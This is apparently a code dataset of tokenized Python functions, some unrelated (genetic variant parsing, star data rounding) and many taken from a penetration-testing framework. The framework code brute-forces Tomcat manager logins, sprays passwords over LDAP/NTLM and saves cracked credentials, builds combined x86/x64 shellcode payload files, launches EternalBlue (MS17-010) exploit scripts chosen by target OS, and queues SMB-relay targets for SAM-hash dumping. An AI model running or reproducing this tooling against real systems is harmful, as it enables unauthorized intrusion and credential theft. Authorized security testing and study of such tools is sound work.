def _parse_frequencies ( self ) : frequencies = OrderedDict ( [ ( 'EXAC' , 'Unknown' ) , ( 'ESP' , 'Unknown' ) , ( 'TGP' , 'Unknown' ) ] ) pref_freq = 'Unknown' for source in frequencies . keys ( ) : freq_key = 'AF_' + source if freq_key in self . info : frequencies [ source ] = self . info [ freq_key ] if pref_freq == 'Unknown' : pref_freq = frequencies [ source ] return pref_freq , frequencies
def _parse_allele_data ( self ) : # Get allele frequencies if they exist. pref_freq , frequencies = self . _parse_frequencies ( ) info_clnvar_single_tags = [ 'ALLELEID' , 'CLNSIG' , 'CLNHGVS' ] cln_data = { x . lower ( ) : self . info [ x ] if x in self . info else None for x in info_clnvar_single_tags } cln_data . update ( { 'clndisdb' : [ x . split ( ',' ) for x in self . info [ 'CLNDISDB' ] . split ( '|' ) ] if 'CLNDISDB' in self . info else [ ] } ) cln_data . update ( { 'clndn' : self . info [ 'CLNDN' ] . split ( '|' ) if 'CLNDN' in self . info else [ ] } ) cln_data . update ( { 'clnvi' : self . info [ 'CLNVI' ] . split ( ',' ) if 'CLNVI' in self . info else [ ] } ) try : sequence = self . alt_alleles [ 0 ] except IndexError : sequence = self . ref_allele allele = ClinVarAllele ( frequency = pref_freq , sequence = sequence , * * cln_data ) # A few ClinVar variants are only reported as a combination with # other variants, and no single-variant effect is proposed. Skip these. if not cln_data [ 'clnsig' ] : return [ ] return [ allele ]
def add ( self , * names ) : def decorator ( blok ) : for name in names or ( blok . __name__ , ) : self [ name ] = blok return blok return decorator
def _filter ( filterObj , * * kwargs ) : for key , value in kwargs . items ( ) : if key . endswith ( '__ne' ) : notFilter = True key = key [ : - 4 ] else : notFilter = False if key not in filterObj . indexedFields : raise ValueError ( 'Field "' + key + '" is not in INDEXED_FIELDS array. Filtering is only supported on indexed fields.' ) if notFilter is False : filterObj . filters . append ( ( key , value ) ) else : filterObj . notFilters . append ( ( key , value ) ) return filterObj
def delete ( self ) : if self . filters or self . notFilters : return self . mdl . deleter . deleteMultiple ( self . allOnlyIndexedFields ( ) ) return self . mdl . deleter . destroyModel ( )
def deleteByPk ( self , pk ) : obj = self . mdl . objects . getOnlyIndexedFields ( pk ) if not obj : return 0 return self . deleteOne ( obj )
def string ( html , start_on = None , ignore = ( ) , use_short = True , * * queries ) : if use_short : html = grow_short ( html ) return _to_template ( fromstring ( html ) , start_on = start_on , ignore = ignore , * * queries )
def file ( file_object , start_on = None , ignore = ( ) , use_short = True , * * queries ) : return string ( file_object . read ( ) , start_on = start_on , ignore = ignore , use_short = use_short , * * queries )
def filename ( file_name , start_on = None , ignore = ( ) , use_short = True , * * queries ) : with open ( file_name ) as template_file : return file ( template_file , start_on = start_on , ignore = ignore , use_short = use_short , * * queries )
def output ( self , to = None , * args , * * kwargs ) : to . write ( str ( self . _value ) )
def keep_kwargs_partial ( func , * args , * * keywords ) : def newfunc ( * fargs , * * fkeywords ) : newkeywords = fkeywords . copy ( ) newkeywords . update ( keywords ) return func ( * ( args + fargs ) , * * newkeywords ) newfunc . func = func newfunc . args = args newfunc . keywords = keywords return newfunc
def overview ( ) : range_search = RangeSearch ( ) ranges = range_search . get_ranges ( ) if ranges : formatted_ranges = [ ] tags_lookup = { } for r in ranges : formatted_ranges . append ( { 'mask' : r . range } ) tags_lookup [ r . range ] = r . tags search = Host . search ( ) search = search . filter ( 'term' , status = 'up' ) search . aggs . bucket ( 'hosts' , 'ip_range' , field = 'address' , ranges = formatted_ranges ) response = search . execute ( ) print_line ( "{0:<18} {1:<6} {2}" . format ( "Range" , "Count" , "Tags" ) ) print_line ( "-" * 60 ) for entry in response . aggregations . hosts . buckets : print_line ( "{0:<18} {1:<6} {2}" . format ( entry . key , entry . doc_count , tags_lookup [ entry . key ] ) ) else : print_error ( "No ranges defined." )
def round_arr_teff_luminosity ( arr ) : arr [ 'temp' ] = np . around ( arr [ 'temp' ] , - 1 ) arr [ 'lum' ] = np . around ( arr [ 'lum' ] , 3 ) return arr
def main ( ) : services = ServiceSearch ( ) argparse = services . argparser argparse . add_argument ( '-f' , '--file' , type = str , help = "File" ) arguments = argparse . parse_args ( ) if not arguments . file : print_error ( "Please provide a file with credentials seperated by ':'" ) sys . exit ( ) services = services . get_services ( search = [ "Tomcat" ] , up = True , tags = [ '!tomcat_brute' ] ) credentials = [ ] with open ( arguments . file , 'r' ) as f : credentials = f . readlines ( ) for service in services : print_notification ( "Checking ip:{} port {}" . format ( service . address , service . port ) ) url = 'http://{}:{}/manager/html' gevent . spawn ( brutefore_passwords , service . address , url . format ( service . address , service . port ) , credentials , service ) service . add_tag ( 'tomcat_brute' ) service . update ( tags = service . tags ) gevent . wait ( ) # TODO fix stats Logger ( ) . log ( "tomcat_brute" , "Performed tomcat bruteforce scan" , { 'scanned_services' : len ( services ) } )
def round_teff_luminosity ( cluster ) : temps = [ round ( t , - 1 ) for t in teff ( cluster ) ] lums = [ round ( l , 3 ) for l in luminosity ( cluster ) ] return temps , lums
def modify_data ( data ) : with tempfile . NamedTemporaryFile ( 'w' ) as f : for entry in data : f . write ( json . dumps ( entry . to_dict ( include_meta = True ) , default = datetime_handler ) ) f . write ( '\n' ) f . flush ( ) print_success ( "Starting editor" ) subprocess . call ( [ 'nano' , '-' , f . name ] ) with open ( f . name , 'r' ) as f : return f . readlines ( )
def modify_input ( ) : doc_mapper = DocMapper ( ) if doc_mapper . is_pipe : objects = [ obj for obj in doc_mapper . get_pipe ( ) ] modified = modify_data ( objects ) for line in modified : obj = doc_mapper . line_to_object ( line ) obj . save ( ) print_success ( "Object(s) successfully changed" ) else : print_error ( "Please use this tool with pipes" )
def bruteforce ( users , domain , password , host ) : cs = CredentialSearch ( use_pipe = False ) print_notification ( "Connecting to {}" . format ( host ) ) s = Server ( host ) c = Connection ( s ) for user in users : if c . rebind ( user = "{}\\{}" . format ( domain , user . username ) , password = password , authentication = NTLM ) : print_success ( 'Success for: {}:{}' . format ( user . username , password ) ) credential = cs . find_object ( user . username , password , domain = domain , host_ip = host ) if not credential : credential = Credential ( username = user . username , secret = password , domain = domain , host_ip = host , type = "plaintext" , port = 389 ) credential . add_tag ( tag ) credential . save ( ) # Add a tag to the user object, so we dont have to bruteforce it again. user . add_tag ( tag ) user . save ( ) else : print_error ( "Fail for: {}:{}" . format ( user . username , password ) )
def utime ( self , * args , * * kwargs ) : os . utime ( self . extended_path , * args , * * kwargs )
def print_line ( text ) : try : signal . signal ( signal . SIGPIPE , signal . SIG_DFL ) except ValueError : pass try : sys . stdout . write ( text ) if not text . endswith ( '\n' ) : sys . stdout . write ( '\n' ) sys . stdout . flush ( ) except IOError : sys . exit ( 0 )
def get_own_ip ( ) : own_ip = None interfaces = psutil . net_if_addrs ( ) for _ , details in interfaces . items ( ) : for detail in details : if detail . family == socket . AF_INET : ip_address = ipaddress . ip_address ( detail . address ) if not ( ip_address . is_link_local or ip_address . is_loopback ) : own_ip = str ( ip_address ) break return own_ip
def remove_namespace ( doc , namespace ) : ns = u'{%s}' % namespace nsl = len ( ns ) for elem in doc . getiterator ( ) : if elem . tag . startswith ( ns ) : elem . tag = elem . tag [ nsl : ] elem . attrib [ 'oxmlns' ] = namespace
def create_payload ( self , x86_file , x64_file , payload_file ) : sc_x86 = open ( os . path . join ( self . datadir , x86_file ) , 'rb' ) . read ( ) sc_x64 = open ( os . path . join ( self . datadir , x64_file ) , 'rb' ) . read ( ) fp = open ( os . path . join ( self . datadir , payload_file ) , 'wb' ) fp . write ( b'\x31\xc0\x40\x0f\x84' + pack ( '<I' , len ( sc_x86 ) ) ) fp . write ( sc_x86 ) fp . write ( sc_x64 ) fp . close ( )
def combine_files ( self , f1 , f2 , f3 ) : with open ( os . path . join ( self . datadir , f3 ) , 'wb' ) as new_file : with open ( os . path . join ( self . datadir , f1 ) , 'rb' ) as file_1 : new_file . write ( file_1 . read ( ) ) with open ( os . path . join ( self . datadir , f2 ) , 'rb' ) as file_2 : new_file . write ( file_2 . read ( ) )
def detect_os ( self , ip ) : process = subprocess . run ( [ 'python2' , os . path . join ( self . datadir , 'MS17-010' , 'checker.py' ) , str ( ip ) ] , stdout = subprocess . PIPE ) out = process . stdout . decode ( 'utf-8' ) . split ( '\n' ) system_os = '' for line in out : if line . startswith ( 'Target OS:' ) : system_os = line . replace ( 'Target OS: ' , '' ) break return system_os
def exploit_single ( self , ip , operating_system ) : result = None if "Windows Server 2008" in operating_system or "Windows 7" in operating_system : result = subprocess . run ( [ 'python2' , os . path . join ( self . datadir , 'MS17-010' , 'eternalblue_exploit7.py' ) , str ( ip ) , os . path . join ( self . datadir , 'final_combined.bin' ) , "12" ] , stdout = subprocess . PIPE , stderr = subprocess . PIPE ) elif "Windows Server 2012" in operating_system or "Windows 10" in operating_system or "Windows 8.1" in operating_system : result = subprocess . run ( [ 'python2' , os . path . join ( self . datadir , 'MS17-010' , 'eternalblue_exploit8.py' ) , str ( ip ) , os . path . join ( self . datadir , 'final_combined.bin' ) , "12" ] , stdout = subprocess . PIPE , stderr = subprocess . PIPE ) else : return [ "System target could not be automatically identified" ] return result . stdout . decode ( 'utf-8' ) . split ( '\n' )
def write_index_translation ( translation_filename , entity_ids , relation_ids ) : translation = triple_pb . Translation ( ) entities = [ ] for name , index in entity_ids . items ( ) : translation . entities . add ( element = name , index = index ) relations = [ ] for name , index in relation_ids . items ( ) : translation . relations . add ( element = name , index = index ) with open ( translation_filename , "wb" ) as f : f . write ( translation . SerializeToString ( ) )
def write_triples ( filename , triples , delimiter = DEFAULT_DELIMITER , triple_order = "hrt" ) : with open ( filename , 'w' ) as f : for t in triples : line = t . serialize ( delimiter , triple_order ) f . write ( line + "\n" )
def read_translation ( filename ) : translation = triple_pb . Translation ( ) with open ( filename , "rb" ) as f : translation . ParseFromString ( f . read ( ) ) def unwrap_translation_units ( units ) : for u in units : yield u . element , u . index return ( list ( unwrap_translation_units ( translation . entities ) ) , list ( unwrap_translation_units ( translation . relations ) ) )
def read_openke_translation ( filename , delimiter = '\t' , entity_first = True ) : result = { } with open ( filename , "r" ) as f : _ = next ( f ) # pass the total entry number for line in f : line_slice = line . rstrip ( ) . split ( delimiter ) if not entity_first : line_slice = list ( reversed ( line_slice ) ) result [ line_slice [ 0 ] ] = line_slice [ 1 ] return result
def overview ( ) : doc = Host ( ) search = doc . search ( ) search . aggs . bucket ( 'tag_count' , 'terms' , field = 'tags' , order = { '_count' : 'desc' } , size = 100 ) response = search . execute ( ) print_line ( "{0:<25} {1}" . format ( 'Tag' , 'Count' ) ) print_line ( "-" * 30 ) for entry in response . aggregations . tag_count . buckets : print_line ( "{0:<25} {1}" . format ( entry . key , entry . doc_count ) )
def overview ( ) : search = Credential . search ( ) search . aggs . bucket ( 'password_count' , 'terms' , field = 'secret' , order = { '_count' : 'desc' } , size = 20 ) . metric ( 'username_count' , 'cardinality' , field = 'username' ) . metric ( 'host_count' , 'cardinality' , field = 'host_ip' ) . metric ( 'top_hits' , 'top_hits' , docvalue_fields = [ 'username' ] , size = 100 ) response = search . execute ( ) print_line ( "{0:65} {1:5} {2:5} {3:5} {4}" . format ( "Secret" , "Count" , "Hosts" , "Users" , "Usernames" ) ) print_line ( "-" * 100 ) for entry in response . aggregations . password_count . buckets : usernames = [ ] for creds in entry . top_hits : usernames . append ( creds . username [ 0 ] ) usernames = list ( set ( usernames ) ) print_line ( "{0:65} {1:5} {2:5} {3:5} {4}" . format ( entry . key , entry . doc_count , entry . host_count . value , entry . username_count . value , usernames ) )
def pipe_worker ( pipename , filename , object_type , query , format_string , unique = False ) : print_notification ( "[{}] Starting pipe" . format ( pipename ) ) object_type = object_type ( ) try : while True : uniq = set ( ) # Remove the previous file if it exists if os . path . exists ( filename ) : os . remove ( filename ) # Create the named pipe os . mkfifo ( filename ) # This function will block until a process opens it with open ( filename , 'w' ) as pipe : print_success ( "[{}] Providing data" . format ( pipename ) ) # Search the database objects = object_type . search ( * * query ) for obj in objects : data = fmt . format ( format_string , * * obj . to_dict ( ) ) if unique : if not data in uniq : uniq . add ( data ) pipe . write ( data + '\n' ) else : pipe . write ( data + '\n' ) os . unlink ( filename ) except KeyboardInterrupt : print_notification ( "[{}] Shutting down named pipe" . format ( pipename ) ) except Exception as e : print_error ( "[{}] Error: {}, stopping named pipe" . format ( e , pipename ) ) finally : os . remove ( filename )
def create_query ( section ) : query = { } if 'ports' in section : query [ 'ports' ] = [ section [ 'ports' ] ] if 'up' in section : query [ 'up' ] = bool ( section [ 'up' ] ) if 'search' in section : query [ 'search' ] = [ section [ 'search' ] ] if 'tags' in section : query [ 'tags' ] = [ section [ 'tags' ] ] if 'groups' in section : query [ 'groups' ] = [ section [ 'groups' ] ] return query
def create_pipe_workers ( configfile , directory ) : type_map = { 'service' : ServiceSearch , 'host' : HostSearch , 'range' : RangeSearch , 'user' : UserSearch } config = configparser . ConfigParser ( ) config . read ( configfile ) if not len ( config . sections ( ) ) : print_error ( "No named pipes configured" ) return print_notification ( "Starting {} pipes in directory {}" . format ( len ( config . sections ( ) ) , directory ) ) workers = [ ] for name in config . sections ( ) : section = config [ name ] query = create_query ( section ) object_type = type_map [ section [ 'type' ] ] args = ( name , os . path . join ( directory , name ) , object_type , query , section [ 'format' ] , bool ( section . get ( 'unique' , 0 ) ) ) workers . append ( multiprocessing . Process ( target = pipe_worker , args = args ) ) return workers
def main ( ) : config = Config ( ) pipes_dir = config . get ( 'pipes' , 'directory' ) pipes_config = config . get ( 'pipes' , 'config_file' ) pipes_config_path = os . path . join ( config . config_dir , pipes_config ) if not os . path . exists ( pipes_config_path ) : print_error ( "Please configure the named pipes first" ) return workers = create_pipe_workers ( pipes_config_path , pipes_dir ) if workers : for worker in workers : worker . start ( ) try : for worker in workers : worker . join ( ) except KeyboardInterrupt : print_notification ( "Shutting down" ) for worker in workers : worker . terminate ( ) worker . join ( )
def main ( ) : search = ServiceSearch ( ) services = search . get_services ( up = True , tags = [ '!header_scan' ] ) print_notification ( "Scanning {} services" . format ( len ( services ) ) ) # Disable the insecure request warning urllib3 . disable_warnings ( urllib3 . exceptions . InsecureRequestWarning ) pool = Pool ( 100 ) count = 0 for service in services : count += 1 if count % 50 == 0 : print_notification ( "Checking {}/{} services" . format ( count , len ( services ) ) ) pool . spawn ( check_service , service ) pool . join ( ) print_notification ( "Completed, 'http' tag added to services that respond to http, 'https' tag added to services that respond to https." )
def import_nmap ( result , tag , check_function = all_hosts , import_services = False ) : host_search = HostSearch ( arguments = False ) service_search = ServiceSearch ( ) parser = NmapParser ( ) report = parser . parse_fromstring ( result ) imported_hosts = 0 imported_services = 0 for nmap_host in report . hosts : if check_function ( nmap_host ) : imported_hosts += 1 host = host_search . id_to_object ( nmap_host . address ) host . status = nmap_host . status host . add_tag ( tag ) if nmap_host . os_fingerprinted : host . os = nmap_host . os_fingerprint if nmap_host . hostnames : host . hostname . extend ( nmap_host . hostnames ) if import_services : for service in nmap_host . services : imported_services += 1 serv = Service ( * * service . get_dict ( ) ) serv . address = nmap_host . address service_id = service_search . object_to_id ( serv ) if service_id : # Existing object, save the banner and script results. serv_old = Service . get ( service_id ) if service . banner : serv_old . banner = service . banner # TODO implement # if service.script_results: # serv_old.script_results.extend(service.script_results) serv_old . save ( ) else : # New object serv . address = nmap_host . address serv . save ( ) if service . state == 'open' : host . open_ports . append ( service . port ) if service . state == 'closed' : host . closed_ports . append ( service . port ) if service . state == 'filtered' : host . filtered_ports . append ( service . port ) host . save ( ) if imported_hosts : print_success ( "Imported {} hosts, with tag {}" . format ( imported_hosts , tag ) ) else : print_error ( "No hosts found" ) return { 'hosts' : imported_hosts , 'services' : imported_services }
def nmap ( nmap_args , ips ) : config = Config ( ) arguments = [ 'nmap' , '-Pn' ] arguments . extend ( ips ) arguments . extend ( nmap_args ) output_file = '' now = datetime . datetime . now ( ) if not '-oA' in nmap_args : output_name = 'nmap_jackal_{}' . format ( now . strftime ( "%Y-%m-%d %H:%M" ) ) path_name = os . path . join ( config . get ( 'nmap' , 'directory' ) , output_name ) print_notification ( "Writing output of nmap to {}" . format ( path_name ) ) if not os . path . exists ( config . get ( 'nmap' , 'directory' ) ) : os . makedirs ( config . get ( 'nmap' , 'directory' ) ) output_file = path_name + '.xml' arguments . extend ( [ '-oA' , path_name ] ) else : output_file = nmap_args [ nmap_args . index ( '-oA' ) + 1 ] + '.xml' print_notification ( "Starting nmap" ) subprocess . call ( arguments ) with open ( output_file , 'r' ) as f : return f . read ( )
def nmap_scan ( ) : # Create the search and config objects hs = HostSearch ( ) config = Config ( ) # Static options to be able to figure out what options to use depending on the input the user gives. nmap_types = [ 'top10' , 'top100' , 'custom' , 'top1000' , 'all' ] options = { 'top10' : '--top-ports 10' , 'top100' : '--top-ports 100' , 'custom' : config . get ( 'nmap' , 'options' ) , 'top1000' : '--top-ports 1000' , 'all' : '-p-' } # Create an argument parser hs_parser = hs . argparser argparser = argparse . ArgumentParser ( parents = [ hs_parser ] , conflict_handler = 'resolve' , description = "Scans hosts from the database using nmap, any arguments that are not in the help are passed to nmap" ) argparser . add_argument ( 'type' , metavar = 'type' , help = 'The number of ports to scan: top10, top100, custom, top1000 (default) or all' , type = str , choices = nmap_types , default = 'top1000' , const = 'top1000' , nargs = '?' ) arguments , extra_nmap_args = argparser . parse_known_args ( ) # Fix the tags for the search tags = nmap_types [ nmap_types . index ( arguments . type ) : ] tags = [ "!nmap_" + tag for tag in tags ] hosts = hs . get_hosts ( tags = tags ) hosts = [ host for host in hosts ] # Create the nmap arguments nmap_args = [ ] nmap_args . extend ( extra_nmap_args ) nmap_args . extend ( options [ arguments . type ] . split ( ' ' ) ) # Run nmap print_notification ( "Running nmap with args: {} on {} hosts(s)" . format ( nmap_args , len ( hosts ) ) ) if len ( hosts ) : result = nmap ( nmap_args , [ str ( h . address ) for h in hosts ] ) # Import the nmap result for host in hosts : host . add_tag ( "nmap_{}" . format ( arguments . type ) ) host . save ( ) print_notification ( "Nmap done, importing results" ) stats = import_nmap ( result , "nmap_{}" . format ( arguments . type ) , check_function = all_hosts , import_services = True ) stats [ 'scanned_hosts' ] = len ( hosts ) stats [ 'type' ] = arguments . type Logger ( ) . log ( 'nmap_scan' , "Performed nmap {} scan on {} hosts" . format ( arguments . type , len ( hosts ) ) , stats ) else : print_notification ( "No hosts found" )
def nmap_smb_vulnscan ( ) : service_search = ServiceSearch ( ) services = service_search . get_services ( ports = [ '445' ] , tags = [ '!smb_vulnscan' ] , up = True ) services = [ service for service in services ] service_dict = { } for service in services : service . add_tag ( 'smb_vulnscan' ) service_dict [ str ( service . address ) ] = service nmap_args = "-Pn -n --disable-arp-ping --script smb-security-mode.nse,smb-vuln-ms17-010.nse -p 445" . split ( " " ) if services : result = nmap ( nmap_args , [ str ( s . address ) for s in services ] ) parser = NmapParser ( ) report = parser . parse_fromstring ( result ) smb_signing = 0 ms17 = 0 for nmap_host in report . hosts : for script_result in nmap_host . scripts_results : script_result = script_result . get ( 'elements' , { } ) service = service_dict [ str ( nmap_host . address ) ] if script_result . get ( 'message_signing' , '' ) == 'disabled' : print_success ( "({}) SMB Signing disabled" . format ( nmap_host . address ) ) service . add_tag ( 'smb_signing_disabled' ) smb_signing += 1 if script_result . get ( 'CVE-2017-0143' , { } ) . get ( 'state' , '' ) == 'VULNERABLE' : print_success ( "({}) Vulnerable for MS17-010" . format ( nmap_host . address ) ) service . add_tag ( 'MS17-010' ) ms17 += 1 service . update ( tags = service . tags ) print_notification ( "Completed, 'smb_signing_disabled' tag added to systems with smb signing disabled, 'MS17-010' tag added to systems that did not apply MS17-010." ) stats = { 'smb_signing' : smb_signing , 'MS17_010' : ms17 , 'scanned_services' : len ( services ) } Logger ( ) . log ( 'smb_vulnscan' , 'Scanned {} smb services for vulnerabilities' . format ( len ( services ) ) , stats ) else : print_notification ( "No services found to scan." )
def add_tag ( ) : if len ( sys . argv ) > 1 : tag = sys . argv [ 1 ] doc_mapper = DocMapper ( ) if doc_mapper . is_pipe : count = 0 for obj in doc_mapper . get_pipe ( ) : obj . add_tag ( tag ) obj . update ( tags = obj . tags ) count += 1 print_success ( "Added tag '{}' to {} object(s)" . format ( tag , count ) ) else : print_error ( "Please use this script with pipes" ) else : print_error ( "Usage: jk-add-tag <tag>" ) sys . exit ( )
def manual_configure ( ) : print ( "Manual configuring jackal" ) mapping = { '1' : 'y' , '0' : 'n' } config = Config ( ) # Host host = input_with_default ( "What is the Elasticsearch host?" , config . get ( 'jackal' , 'host' ) ) config . set ( 'jackal' , 'host' , host ) # SSL if input_with_default ( "Use SSL?" , mapping [ config . get ( 'jackal' , 'use_ssl' ) ] ) == 'y' : config . set ( 'jackal' , 'use_ssl' , '1' ) if input_with_default ( "Setup custom server cert?" , 'y' ) == 'y' : ca_certs = input_with_default ( "Server certificate location?" , config . get ( 'jackal' , 'ca_certs' ) ) config . set ( 'jackal' , 'ca_certs' , ca_certs ) else : config . set ( 'jackal' , 'ca_certs' , '' ) else : config . set ( 'jackal' , 'use_ssl' , '0' ) if input_with_default ( "Setup client certificates?" , mapping [ config . get ( 'jackal' , 'client_certs' ) ] ) == 'y' : config . set ( 'jackal' , 'client_certs' , '1' ) client_cert = input_with_default ( "Client cert location?" , config . get ( 'jackal' , 'client_cert' ) ) config . set ( 'jackal' , 'client_cert' , client_cert ) client_key = input_with_default ( "Client key location?" , config . get ( 'jackal' , 'client_key' ) ) config . set ( 'jackal' , 'client_key' , client_key ) else : config . set ( 'jackal' , 'client_certs' , '0' ) # Index index = input_with_default ( "What index prefix should jackal use?" , config . get ( 'jackal' , 'index' ) ) config . set ( 'jackal' , 'index' , index ) initialize_indices = ( input_with_default ( "Do you want to initialize the indices?" , 'y' ) . lower ( ) == 'y' ) # Nmap nmap_dir = input_with_default ( "What directory do you want to place the nmap results in?" , config . get ( 'nmap' , 'directory' ) ) if not os . path . exists ( nmap_dir ) : os . makedirs ( nmap_dir ) config . set ( 'nmap' , 'directory' , nmap_dir ) nmap_options = input_with_default ( "What nmap options do you want to set for 'custom' (for example '-p 22,445')?" , config . get ( 'nmap' , 'options' ) ) config . set ( 'nmap' , 'options' , nmap_options ) # Nessus configure_nessus = ( input_with_default ( "Do you want to setup nessus?" , 'n' ) . lower ( ) == 'y' ) if configure_nessus : nessus_host = input_with_default ( "What is the nessus host?" , config . get ( 'nessus' , 'host' ) ) nessus_template = input_with_default ( "What template should jackal use?" , config . get ( 'nessus' , 'template_name' ) ) nessus_access = input_with_default ( "What api access key should jackal use?" , config . get ( 'nessus' , 'access_key' ) ) nessus_secret = input_with_default ( "What api secret key should jackal use?" , config . get ( 'nessus' , 'secret_key' ) ) config . set ( 'nessus' , 'host' , nessus_host ) config . set ( 'nessus' , 'template_name' , nessus_template ) config . set ( 'nessus' , 'access_key' , nessus_access ) config . set ( 'nessus' , 'secret_key' , nessus_secret ) # Named pipes configure_pipes = ( input_with_default ( "Do you want to setup named pipes?" , 'n' ) . lower ( ) == 'y' ) if configure_pipes : directory = input_with_default ( "What directory do you want to place the named pipes in?" , config . get ( 'pipes' , 'directory' ) ) config . set ( 'pipes' , 'directory' , directory ) config_file = input_with_default ( "What is the name of the named pipe config?" , config . get ( 'pipes' , 'config_file' ) ) config . set ( 'pipes' , 'config_file' , config_file ) if not os . path . exists ( directory ) : create = ( input_with_default ( "Do you want to create the directory?" , 'n' ) . lower ( ) == 'y' ) if create : os . makedirs ( directory ) if not os . path . exists ( os . path . join ( config . config_dir , config_file ) ) : f = open ( os . path . join ( config . config_dir , config_file ) , 'a' ) f . close ( ) config . write_config ( initialize_indices )
def config_dir ( self ) : home = expanduser ( '~' ) config_dir = os . path . join ( home , '.jackal' ) return config_dir
def write_config ( self , initialize_indices = False ) : if not os . path . exists ( self . config_dir ) : os . mkdir ( self . config_dir ) with open ( self . config_file , 'w' ) as configfile : self . config . write ( configfile ) if initialize_indices : index = self . get ( 'jackal' , 'index' ) from jackal import Host , Range , Service , User , Credential , Log from jackal . core import create_connection create_connection ( self ) Host . init ( index = "{}-hosts" . format ( index ) ) Range . init ( index = "{}-ranges" . format ( index ) ) Service . init ( index = "{}-services" . format ( index ) ) User . init ( index = "{}-users" . format ( index ) ) Credential . init ( index = "{}-creds" . format ( index ) ) Log . init ( index = "{}-log" . format ( index ) )
def ensure_remote_branch_is_tracked ( branch ) : if branch == MASTER_BRANCH : # We don't need to explicitly track the master branch, so we're done. return # Ensure the specified branch is in the local branch list. output = subprocess . check_output ( [ 'git' , 'branch' , '--list' ] ) for line in output . split ( '\n' ) : if line . strip ( ) == branch : # We are already tracking the remote branch break else : # We are not tracking the remote branch, so track it. try : sys . stdout . write ( subprocess . check_output ( [ 'git' , 'checkout' , '--track' , 'origin/%s' % branch ] ) ) except subprocess . CalledProcessError : # Bail gracefully. raise SystemExit ( 1 )
def main ( branch ) : try : # Ensure that we're in a git repository. This command is silent unless # you're not actually in a git repository, in which case, you receive a # "Not a git repository" error message. output = subprocess . check_output ( [ 'git' , 'rev-parse' ] ) . decode ( 'utf-8' ) sys . stdout . write ( output ) except subprocess . CalledProcessError : # Bail if we're not in a git repository. return # This behavior ensures a better user experience for those that aren't # intimately familiar with git. ensure_remote_branch_is_tracked ( branch ) # Switch to the specified branch and update it. subprocess . check_call ( [ 'git' , 'checkout' , '--quiet' , branch ] ) # Pulling is always safe here, because we never commit to this branch. subprocess . check_call ( [ 'git' , 'pull' , '--quiet' ] ) # Checkout the top commit in the branch, effectively going "untracked." subprocess . check_call ( [ 'git' , 'checkout' , '--quiet' , '%s~0' % branch ] ) # Clean up the repository of Python cruft. Because we've just switched # branches and compiled Python files should not be version controlled, # there are likely leftover compiled Python files sitting on disk which may # confuse some tools, such as sqlalchemy-migrate. subprocess . check_call ( [ 'find' , '.' , '-name' , '"*.pyc"' , '-delete' ] ) # For the sake of user experience, give some familiar output. print ( 'Your branch is up to date with branch \'origin/%s\'.' % branch )
def get_interface_name ( ) : interface_name = '' interfaces = psutil . net_if_addrs ( ) for name , details in interfaces . items ( ) : for detail in details : if detail . family == socket . AF_INET : ip_address = ipaddress . ip_address ( detail . address ) if not ( ip_address . is_link_local or ip_address . is_loopback ) : interface_name = name break return interface_name
def load_targets ( self ) : ldap_services = [ ] if self . ldap : ldap_services = self . search . get_services ( ports = [ 389 ] , up = True ) self . ldap_strings = [ "ldap://{}" . format ( service . address ) for service in ldap_services ] self . services = self . search . get_services ( tags = [ 'smb_signing_disabled' ] ) self . ips = [ str ( service . address ) for service in self . services ]
def write_targets ( self ) : if len ( self . ldap_strings ) == 0 and len ( self . ips ) == 0 : print_notification ( "No targets left" ) if self . auto_exit : if self . notifier : self . notifier . stop ( ) self . terminate_processes ( ) with open ( self . targets_file , 'w' ) as f : f . write ( '\n' . join ( self . ldap_strings + self . ips ) )
def callback ( self , event ) : # IN_CLOSE_WRITE -> 0x00000008 if event . mask == 0x00000008 : if event . name . endswith ( '.json' ) : print_success ( "Ldapdomaindump file found" ) if event . name in [ 'domain_groups.json' , 'domain_users.json' ] : if event . name == 'domain_groups.json' : self . domain_groups_file = event . pathname if event . name == 'domain_users.json' : self . domain_users_file = event . pathname if self . domain_groups_file and self . domain_users_file : print_success ( "Importing users" ) subprocess . Popen ( [ 'jk-import-domaindump' , self . domain_groups_file , self . domain_users_file ] ) elif event . name == 'domain_computers.json' : print_success ( "Importing computers" ) subprocess . Popen ( [ 'jk-import-domaindump' , event . pathname ] ) # Ldap has been dumped, so remove the ldap targets. self . ldap_strings = [ ] self . write_targets ( ) if event . name . endswith ( '_samhashes.sam' ) : host = event . name . replace ( '_samhashes.sam' , '' ) # TODO import file. print_success ( "Secretsdump file, host ip: {}" . format ( host ) ) subprocess . Popen ( [ 'jk-import-secretsdump' , event . pathname ] ) # Remove this system from this ip list. self . ips . remove ( host ) self . write_targets ( )
def watch ( self ) : wm = pyinotify . WatchManager ( ) self . notifier = pyinotify . Notifier ( wm , default_proc_fun = self . callback ) wm . add_watch ( self . directory , pyinotify . ALL_EVENTS ) try : self . notifier . loop ( ) except ( KeyboardInterrupt , AttributeError ) : print_notification ( "Stopping" ) finally : self . notifier . stop ( ) self . terminate_processes ( )
def terminate_processes ( self ) : if self . relay : self . relay . terminate ( ) if self . responder : self . responder . terminate ( )
def get_template_uuid ( self ) : response = requests . get ( self . url + 'editor/scan/templates' , headers = self . headers , verify = False ) templates = json . loads ( response . text ) for template in templates [ 'templates' ] : if template [ 'name' ] == self . template_name : return template [ 'uuid' ]
def start_scan ( self , scan_id ) : requests . post ( self . url + 'scans/{}/launch' . format ( scan_id ) , verify = False , headers = self . headers )
def cmpToDataStore_uri ( base , ds1 , ds2 ) : ret = difflib . get_close_matches ( base . uri , [ ds1 . uri , ds2 . uri ] , 1 , cutoff = 0.5 ) if len ( ret ) <= 0 : return 0 if ret [ 0 ] == ds1 . uri : return - 1 return 1
def add_tag ( self , tag ) : self . tags = list ( set ( self . tags or [ ] ) | set ( [ tag ] ) )
def remove_tag ( self , tag ) : self . tags = list ( set ( self . tags or [ ] ) - set ( [ tag ] ) )
def to_dict ( self , include_meta = False ) : result = super ( JackalDoc , self ) . to_dict ( include_meta = include_meta ) if include_meta : source = result . pop ( '_source' ) return { * * result , * * source } else : return result
def lookup ( cls , key , get = False ) : if get : item = cls . _item_dict . get ( key ) return item . name if item else key return cls . _item_dict [ key ] . name
def verbose ( cls , key = False , default = '' ) : if key is False : items = cls . _item_dict . values ( ) return [ ( x . key , x . value ) for x in sorted ( items , key = lambda x : x . sort or x . key ) ] item = cls . _item_dict . get ( key ) return item . value if item else default
